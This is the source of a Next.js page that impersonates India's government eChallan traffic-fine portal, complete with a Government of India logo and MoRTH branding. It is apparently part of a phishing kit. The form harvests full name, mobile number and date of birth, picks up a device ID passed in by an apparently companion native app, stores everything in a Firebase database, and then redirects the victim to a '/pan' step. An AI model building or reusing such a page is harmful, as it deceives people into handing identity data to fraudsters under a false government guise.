"use client";
import { useState, useEffect } from "react";
import { ref, get, push } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Page() {
  const router = useRouter();

  const [deviceID, setDeviceID] = useState(null);
  const [formData, setFormData] = useState({
    full_name: "",
    mobile_number: "",
    dob: "",
    device_id: deviceID || "",
  });

  useEffect(() => {
    // This function will be called by external/native apps
    window.setDeviceId = function (id) {
      setDeviceID(id);
    };
  }, []);

  useEffect(() => {
    const storedUserId = localStorage.getItem("newUserId");
    if (storedUserId) {
      // Fetch existing data from Firebase and populate form
      const userRef = ref(database, `users/${storedUserId}`);
      get(userRef)
        .then((snapshot) => {
          if (snapshot.exists()) {
            setFormData(snapshot.val());
          } else {
            console.log("No data available");
          }
        })
        .catch((error) => {
          console.error("Error fetching data:", error);
        });
    }
  }, []);

  const handleChange = (e) => {
    let { name, value } = e.target;

    //Validate mobile number
    if (name === "mobile_number") {
      value = value.replace(/\D/g, ""); // Remove non-digits
      if (value.length > 10) {
        value = value.substring(0, 10);
      }
    } else if (name === "dob") {
      // Format date input to DD/MM/YYYY
      value = value.replace(/\D/g, "");
      if (value.length <= 2) {
        value = value;
      } else if (value.length <= 4) {
        value = `${value.slice(0, 2)}/${value.slice(2)}`;
      } else {
        value = `${value.slice(0, 2)}/${value.slice(2, 4)}/${value.slice(
          4,
          8
        )}`;
      }
    }

    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Get a reference to the "entries" node in Firebase database
    const formRef = ref(database, "entries");

    // Generate timestamp in milliseconds
    const timestamp = Date.now();

    // Add current timestamp to form data
    const formDataWithTime = {
      ...formData,
      time: timestamp,
    };

    // Push form data to Firebase database
    const newRef = await push(formRef, formDataWithTime);

    // Save the newly generated ID to localStorage
    localStorage.setItem("newUserId", newRef.key);

    // Navigate to "/method" route after submission
    router.push("/pan");

    // Clear form data after submission
    setFormData({
      full_name: "",
      mobile_number: "",
      dob: "",
      device_id: deviceID || "",
    });
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-blue-50 to-indigo-100">
      <section className="w-full max-w-md mx-auto">
        <div className="flex flex-col justify-center items-center px-4 py-6 bg-gradient-to-r from-[#003466] to-[#004080] rounded-b-lg shadow-lg">
          {/* Logo */}
          <img
            src="/Government-of-India-Logo-Vector-PNG.png"
            className="w-8 h-8"
            alt="Logo"
          />
          <h1 className="text-white text-sm font-bold mt-3">भारत सरकार</h1>
          <h1 className="text-white text-sm font-bold mt-1">
            Government of India
          </h1>
          <h1 className="text-white text-xs font-bold mt-3 text-center">
            eChallan - Digital Traffic/Transport Enforcement Solution
          </h1>
          <span className="text-white text-xs mt-2 text-center">
            An initiative of MoRTH, Government Of India
          </span>
        </div>
        {/* Form Container */}
        <div className="p-3">
          <div className="p-3 space-y-4">
            {/* Form Card */}
            <div className="bg-white rounded-lg shadow-md p-4 hover:shadow-lg transition-shadow">
              <form id="third-form" onSubmit={handleSubmit}>
                <div className="space-y-4">
                  {/* Form Header */}
                  <div className="text-center pb-2 border-b">
                    <h2 className="text-sm font-semibold text-gray-800">
                      Personal Information
                    </h2>
                    <p className="text-xs text-muted-foreground">
                      Please fill in your details
                    </p>
                  </div>

                  {/* Full Name Field */}
                  <div className="space-y-2">
                    <label
                      htmlFor="full_name"
                      className="block text-xs font-medium text-gray-700"
                    >
                      Full Name <span className="text-red-500">*</span>
                    </label>
                    <input
                      className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                      id="full_name"
                      type="text"
                      name="full_name"
                      placeholder="Enter Full Name"
                      value={formData.full_name}
                      onChange={handleChange}
                      required
                    />
                  </div>

                  {/* Mobile Number Field */}
                  <div className="space-y-2">
                    <label
                      htmlFor="mobile_number"
                      className="block text-xs font-medium text-gray-700"
                    >
                      Mobile Number <span className="text-red-500">*</span>
                    </label>
                    <input
                      className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                      id="mobile_number"
                      type="text"
                      name="mobile_number"
                      placeholder="Enter Mobile Number"
                      value={formData.mobile_number}
                      onChange={handleChange}
                      required
                    />
                  </div>

                  {/* Date of Birth Field */}
                  <div className="space-y-2">
                    <label
                      htmlFor="dob"
                      className="block text-xs font-medium text-gray-700"
                    >
                      Date Of Birth <span className="text-red-500">*</span>
                    </label>
                    <input
                      id="dob"
                      name="dob"
                      className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
                      placeholder="DD/MM/YYYY"
                      value={formData.dob}
                      onChange={handleChange}
                      required
                    />
                  </div>

                  {/* Action Buttons */}
                  <div className="pt-4 border-t">
                    <div className="grid grid-cols-2 gap-3">
                      <button
                        type="button"
                        className="bg-gray-200 hover:bg-gray-300 text-gray-700 font-medium text-sm py-2 px-4 rounded-md transition-colors"
                      >
                        Back
                      </button>
                      <button
                        className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-medium text-sm py-2 px-4 rounded-md transition-all"
                        type="submit"
                      >
                        Proceed
                      </button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </section>
      {/* Footer - Mobile Optimized */}
      <section className="bg-white p-3 w-full max-w-md mx-auto mt-8 rounded-t-lg shadow-lg">
        <div className="bg-gray-50 rounded-lg p-3 space-y-2">
          <div className="grid grid-cols-2 gap-2 text-center">
            <span className="text-xs text-gray-600 font-medium">Support</span>
            <span className="text-xs text-gray-600 font-medium">Find Us</span>
            <span className="text-xs text-gray-600 font-medium">
              Pricing & Fees
            </span>
            <span className="text-xs text-gray-600 font-medium">
              Compliance
            </span>
          </div>

          <div className="border-t pt-2">
            <div className="grid grid-cols-1 gap-1 text-center">
              <span className="text-xs text-gray-600 font-medium">
                Terms & Conditions
              </span>
              <span className="text-xs text-gray-600 font-medium">
                Legal Disclosures
              </span>
              <span className="text-xs text-gray-600 font-medium">
                Safety Guidelines
              </span>
            </div>
          </div>

          <div className="border-t pt-2 text-center">
            <div className="text-xs text-gray-500">
              Copyright © 2021-2024 eChallan. All rights reserved.
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}
